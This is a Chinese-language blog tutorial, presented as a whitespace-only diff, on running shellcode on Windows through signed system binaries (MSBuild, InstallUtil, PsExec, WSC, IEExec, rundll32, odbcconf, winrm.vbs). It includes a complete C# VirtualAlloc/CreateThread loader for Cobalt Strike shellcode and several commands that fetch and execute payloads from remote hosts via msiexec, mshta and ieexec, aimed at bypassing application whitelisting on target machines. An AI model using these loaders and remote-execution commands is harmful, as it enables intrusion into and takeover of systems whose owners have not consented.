-<p>​        首先我们准备一个xml的[模板]([<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml]" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml]</a>(<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> shellcode.xml)),下载好后使用cs生成一个c#的shellcode，对xml中执行shellcode部分的内容进行替换，使用如下命令加载xml文件</p>
+<p> 首先我们准备一个xml的[模板]([[<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml\]]" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml\]]</a>(<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> shellcode.xml])(<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> shellcode.xml)),下载好后使用cs生成一个c#的shellcode，对xml中执行shellcode部分的内容进行替换，使用如下命令加载xml文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 1.xml</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200807175852058.png" alt="image-20200807175852058"></p>
-<h3 id="CSC-Installutil"><a href="#CSC-Installutil" class="headerlink" title="CSC+Installutil"></a>CSC+Installutil</h3><p>​        csc是一个C#的命令行编译工具，可以用来编译.cs文件。</p>
-<p>​        Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。</p>
+<h3 id="CSC-Installutil"><a href="#CSC-Installutil" class="headerlink" title="CSC+Installutil"></a>CSC+Installutil</h3><p> csc是一个C#的命令行编译工具，可以用来编译.cs文件。</p>
+<p> Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来安装和卸载服务器资源。</p>
 <p><strong>如何利用？</strong></p>
-<p>​        首先使用CS生成一个c#的shellcode，将生成的shellcode文件插入到<a href="https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260" target="_blank" rel="noopener">InstallUtil-Shellcode-cs</a>这个模板中，使用如下命令进行编译</p>
+<p> 首先使用CS生成一个c#的shellcode，将生成的shellcode文件插入到<a href="https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260" target="_blank" rel="noopener">InstallUtil-Shellcode-cs</a>这个模板中，使用如下命令进行编译</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;out:C:\Users\admin\Desktop\xxxx\SharpCat.exe  &#x2F;unsafe C:\Users\admin\Desktop\xxx\InstallUtil-Shellcode.cs</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170200605.png" alt="image-20200810170200605"></p>
-<p>​        将生成的exe上传到目标主机，使用如下命令进行加载执行</p>
+<p> 将生成的exe上传到目标主机，使用如下命令进行加载执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U SharpCat.exe</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170509058.png" alt="image-20200810170509058"></p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810170531338.png" alt="image-20200810170531338"></p>
-<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>​        微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。</p>
+<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p> 微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -accepteula -d -s msiexec.exe &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxx:999&#x2F;cmd.msi</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810171425659.png" alt="image-20200810171425659"></p>
 <h3 id="WSC"><a href="#WSC" class="headerlink" title="WSC"></a>WSC</h3><p><strong>什么是WSC？</strong></p>
-<p>​    Windows Script Components (WSC)，以前称为Scriplets，是一种以容易的方式开发强大的COM组件的技术。 WSC可以用任何实现了ActiveX脚本接口的脚本语言来编写，这意味着PerlScript代码单元可以封装为Windows脚本组件。</p>
+<p> Windows Script Components (WSC)，以前称为Scriplets，是一种以容易的方式开发强大的COM组件的技术。 WSC可以用任何实现了ActiveX脚本接口的脚本语言来编写，这意味着PerlScript代码单元可以封装为Windows脚本组件。</p>
 <p><strong>怎么使用WSC执行命令？</strong></p>
-<p>​    首先我们创建一个wsc文件，文件内容如下：</p>
+<p> 首先我们创建一个wsc文件，文件内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;    </span><br><span class="line">&lt;package&gt;</span><br><span class="line">&lt;component id&#x3D;&quot;testCalc&quot;&gt;    </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;    </span><br><span class="line">&lt;&#x2F;component&gt;</span><br><span class="line">&lt;&#x2F;package&gt;</span><br></pre></td></tr></table></figure>
 
-<p>​    再创建一个js文件，文件内容如下</p>
+<p> 再创建一个js文件，文件内容如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:C:\\Users\\jerry\\Desktop\\test666.wsc&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>​    最后通过csript 1.js执行命令</p>
+<p> 最后通过csript 1.js执行命令</p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200804170202844.png" alt="image-20200804170202844"></p>
-<p>​    也可以将WSC文件挂载到远程，修改1.js中的内容,也可以执行命令</p>
+<p> 也可以将WSC文件挂载到远程，修改1.js中的内容,也可以执行命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetObject(&quot;script:http:&#x2F;&#x2F;xxx.xxx.xx.xx:xxx&#x2F;test666&quot;);</span><br></pre></td></tr></table></figure>
 
-<h3 id="IEExec（利用失败）"><a href="#IEExec（利用失败）" class="headerlink" title="IEExec（利用失败）"></a>IEExec（利用失败）</h3><p>​        IEExec是一个Microsoft二进制文件，它是.NET Framework（v2.0.50727）的一部分，并且能够通过指定URL运行在远程目标上托管的应用程序。由于IEExec是Microsoft受信任的实用程序，因此攻击者可以绕过AppLocker和其他应用程序白名单解决方案来运行可执行文件。</p>
-<p>​        使用这种方式首先要禁用代码访问策略，允许执行.net代码,使用管理员权限运行如下命令</p>
+<h3 id="IEExec（利用失败）"><a href="#IEExec（利用失败）" class="headerlink" title="IEExec（利用失败）"></a>IEExec（利用失败）</h3><p> IEExec是一个Microsoft二进制文件，它是.NET Framework（v2.0.50727）的一部分，并且能够通过指定URL运行在远程目标上托管的应用程序。由于IEExec是Microsoft受信任的实用程序，因此攻击者可以绕过AppLocker和其他应用程序白名单解决方案来运行可执行文件。</p>
+<p> 使用这种方式首先要禁用代码访问策略，允许执行.net代码,使用管理员权限运行如下命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\CasPol.exe  -s off</span><br></pre></td></tr></table></figure>
 
-<p>​        CasPol.exe文件在有些win10中和win2012中没有在v2.2.50727目录下，在v4.0.30319目录下，但是这个里面的CasPol没有-s参数。</p>
-<p>​        使用CS生成一个C#的shellcode并放到如下的执行模板中</p>
+<p> CasPol.exe文件在有些win10中和win2012中没有在v2.2.50727目录下，在v4.0.30319目录下，但是这个里面的CasPol没有-s参数。</p>
+<p> 使用CS生成一个C#的shellcode并放到如下的执行模板中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace testIEexec</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        private static UInt32 MEM_COMMIT &#x3D; 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE &#x3D; 0x40;</span><br><span class="line">        private static UInt32 MEM_RELEASE &#x3D; 0x8000;</span><br><span class="line">        public static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 替换下面数组中的内容</span><br><span class="line">            byte[] proc &#x3D; new byte[894] &#123; 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00,............. &#125;;</span><br><span class="line">            UInt32 funcAddr &#x3D; VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length);</span><br><span class="line">            IntPtr hThread &#x3D; IntPtr.Zero;</span><br><span class="line">            UInt32 threadId &#x3D; 0;</span><br><span class="line">            &#x2F;&#x2F; prepare data </span><br><span class="line">            PROCESSOR_INFO info &#x3D; new PROCESSOR_INFO();</span><br><span class="line">            IntPtr pinfo &#x3D; Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO)));</span><br><span class="line">            Marshal.StructureToPtr(info, pinfo, false);</span><br><span class="line">            &#x2F;&#x2F; execute native code </span><br><span class="line">            hThread &#x3D; CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            &#x2F;&#x2F; retrive data </span><br><span class="line">            info &#x3D; (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO));</span><br><span class="line">            Marshal.FreeHGlobal(pinfo);</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE);</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr GetModuleHandle(string moduleName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 LoadLibrary(string lpFileName);</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 GetLastError();</span><br><span class="line">        [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">        internal struct PROCESSOR_INFO</span><br><span class="line">        &#123;</span><br><span class="line">            public UInt32 dwMax;</span><br><span class="line">            public UInt32 id0;</span><br><span class="line">            public UInt32 id1;</span><br><span class="line">            public UInt32 id2;</span><br><span class="line">            public UInt32 dwStandard;</span><br><span class="line">            public UInt32 dwFeature;</span><br><span class="line">            &#x2F;&#x2F; if AMD </span><br><span class="line">            public UInt32 dwExt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>​        将该文件编译为exe，并且放到web上，使用如下命令进行加载</p>
+<p> 将该文件编译为exe，并且放到web上，使用如下命令进行加载</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http:&#x2F;&#x2F;xxx.xxx.xx.xx:803&#x2F;test.exe</span><br></pre></td></tr></table></figure>
 
-<p>​        这里我测试虽然请求了远程的地址，但是并没有上线，原因未知，这种方式比较鸡肋，因为我在其他的windows10和2012中没有找到ieexec.exe这个文件。</p>
+<p> 这里我测试虽然请求了远程的地址，但是并没有上线，原因未知，这种方式比较鸡肋，因为我在其他的windows10和2012中没有找到ieexec.exe这个文件。</p>
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810140930599.png" alt="image-20200810140930599"></p>
-<h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><p>​        Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。</p>
-<p>​        可以使用下面的方式执行本地exe文件</p>
+<h3 id="rundll32"><a href="#rundll32" class="headerlink" title="rundll32"></a>rundll32</h3><p> Rundll32.exe是指“执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数,功能就是以命令行的方式调用动态链接程序库。</p>
+<p> 可以使用下面的方式执行本地exe文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL calc.exe</span><br><span class="line">rundll32.exe url.dll,FileProtocolHandler calc.exe</span><br><span class="line">rundll32.exe zipfldr.dll, RouteTheCall calc.exe</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810142457880.png" alt="image-20200810142457880"></p>
-<p>​        除了直接加载exe，也可以通过如下方式加载。</p>
-<p>​        首先编写一个.url文件，文件内容如下：</p>
+<p> 除了直接加载exe，也可以通过如下方式加载。</p>
+<p> 首先编写一个.url文件，文件内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL&#x3D;c:\windows\system32\calc.exe</span><br></pre></td></tr></table></figure>
 
-<p>​        使用rundll32加载url文件执行exe</p>
+<p> 使用rundll32加载url文件执行exe</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe ieframe.dll,OpenURL  C:\Users\jerry\Desktop\test.url</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810145839888.png" alt="image-20200810145839888"></p>
 <p><strong>如何使用rundll32执行其他脚本？</strong></p>
-<p>​    <strong>加载js文件</strong></p>
-<p>​        首先准备一个js文件，内容如下：</p>
+<p> <strong>加载js文件</strong></p>
+<p> 首先准备一个js文件，内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WScript.Echo(&quot;1&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>​        使用rundll32加载js文件</p>
+<p> 使用rundll32加载js文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL C:\Users\jerry\Desktop\test.js</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810150344638.png" alt="image-20200810150344638"></p>
-<p>​    <strong>加载hta文件</strong></p>
-<p>​        准备一个hta文件，内容如下：</p>
+<p> <strong>加载hta文件</strong></p>
+<p> 准备一个hta文件，内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt; </span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>
 
-<p>​        使用如下命令加载hta文件</p>
+<p> 使用如下命令加载hta文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURLA  C:\Users\jerry\Desktop\test.hta</span><br></pre></td></tr></table></figure>
 
 <p><strong>如何使用rundll32加载远程文件？</strong></p>
-<p>​        通过调用WScript.shell组件加载mshta.exe远程加载exe命令执行</p>
+<p> 通过调用WScript.shell组件加载mshta.exe远程加载exe命令执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810151759209.png" alt="image-20200810151759209"></p>
-<h3 id="pubprn-vbs-利用失败"><a href="#pubprn-vbs-利用失败" class="headerlink" title="pubprn.vbs(利用失败)"></a>pubprn.vbs(利用失败)</h3><p>​        我在windows10下测试，命令如下,提示找不到路径</p>
+<h3 id="pubprn-vbs-利用失败"><a href="#pubprn-vbs-利用失败" class="headerlink" title="pubprn.vbs(利用失败)"></a>pubprn.vbs(利用失败)</h3><p> 我在windows10下测试，命令如下,提示找不到路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.sct</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810155430373.png" alt="image-20200810155430373"></p>
-<p>​        在2012中进行测试，发现虽然会可以找到这个路径进行加载，但是不会执行sct文件。</p>
-<h3 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h3><p>​        ODBCCONF.exe是一个命令行工具，它允许您配置ODBC驱动程序和数据源名称,可能在以后的版本会删除,可以使用PowerShell命令来管理驱动程序和数据源。使用ODBCCONF可以加载任意的dll文件</p>
-<p>​        首先准备一个dll文件，使用如下命令进行加载</p>
+<p> 在2012中进行测试，发现虽然会可以找到这个路径进行加载，但是不会执行sct文件。</p>
+<h3 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h3><p> ODBCCONF.exe是一个命令行工具，它允许您配置ODBC驱动程序和数据源名称,可能在以后的版本会删除,可以使用PowerShell命令来管理驱动程序和数据源。使用ODBCCONF可以加载任意的dll文件</p>
+<p> 首先准备一个dll文件，使用如下命令进行加载</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr C:\shell.dll&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810161025395.png" alt="image-20200810161025395"></p>
-<p>​        需要注意生成的dll文件要和系统的版本对应，否则执行会报错</p>
-<h3 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h3><p>​        winrm.vbs（一个位于system32目录下的具有Windows签名的脚本文件）可以被用来调用用户定义的XSL文件，从而导致任意的、没有签名的代码执行。</p>
+<p> 需要注意生成的dll文件要和系统的版本对应，否则执行会报错</p>
+<h3 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h3><p> winrm.vbs（一个位于system32目录下的具有Windows签名的脚本文件）可以被用来调用用户定义的XSL文件，从而导致任意的、没有签名的代码执行。</p>
 <p><strong>如何利用winrm执行？</strong></p>
-<p>​        首先创建一个目录，并且将cscript.exe复制到这个目录下</p>
+<p> 首先创建一个目录，并且将cscript.exe复制到这个目录下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\Windows\System32\cscript.exe xxx</span><br></pre></td></tr></table></figure>
 
-<p>​        准备一个WsmPty.xsl文件，也放到该目录下，文件内容如下：</p>
+<p> 准备一个WsmPty.xsl文件，也放到该目录下，文件内容如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>
 
-<p>​        使用如下命令运行</p>
+<p> 使用如下命令运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo C:\Windows\System32\winrm.vbs get wmicimv2&#x2F;Win32_Process?Handle&#x3D;4 -format:pretty</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810164336074.png" alt="image-20200810164336074"></p>
-<h3 id="regasm"><a href="#regasm" class="headerlink" title="regasm"></a>regasm</h3><p>​        RegAsm读取程序集中的元数据，并将所需项添加到注册表中。注册表允许 COM 客户端以透明方式创建 .NET Framework 类。 在注册一个类之后，任何 COM 客户端都可以像使用 COM 类一样使用它。 类仅在安装程序集时注册一次。 只有实际注册程序集中的类实例之后才能从 COM 中创建它们。</p>
+<h3 id="regasm"><a href="#regasm" class="headerlink" title="regasm"></a>regasm</h3><p> RegAsm读取程序集中的元数据，并将所需项添加到注册表中。注册表允许 COM 客户端以透明方式创建 .NET Framework 类。 在注册一个类之后，任何 COM 客户端都可以像使用 COM 类一样使用它。 类仅在安装程序集时注册一次。 只有实际注册程序集中的类实例之后才能从 COM 中创建它们。</p>
 <p><strong>如何利用？</strong></p>
